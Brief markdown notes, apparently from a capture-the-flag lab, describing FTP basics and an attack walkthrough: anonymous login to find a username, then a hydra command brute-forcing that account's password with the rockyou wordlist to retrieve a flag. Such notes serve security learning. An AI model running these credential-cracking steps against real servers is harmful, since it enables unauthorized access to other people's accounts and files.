# File Transfer Protocol (ftp)

## info

Standard port 21.
Two channels: one for commands, one for data transfer
Two 'modes':
  - __active__ - client opens port, server connects to it
  - __pasive__ - server opens port, client connects to it


## exploit

misconfigure by logging in anonymous, by typing:
`ftp [IP]`, entering "anonymous", no password

retrieved username Mike.

use _hydra_ to crack password:
`hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt.gz -vV [ip] ftp`

connect with `ftp` using username `mike` and password.. `get` the flag.
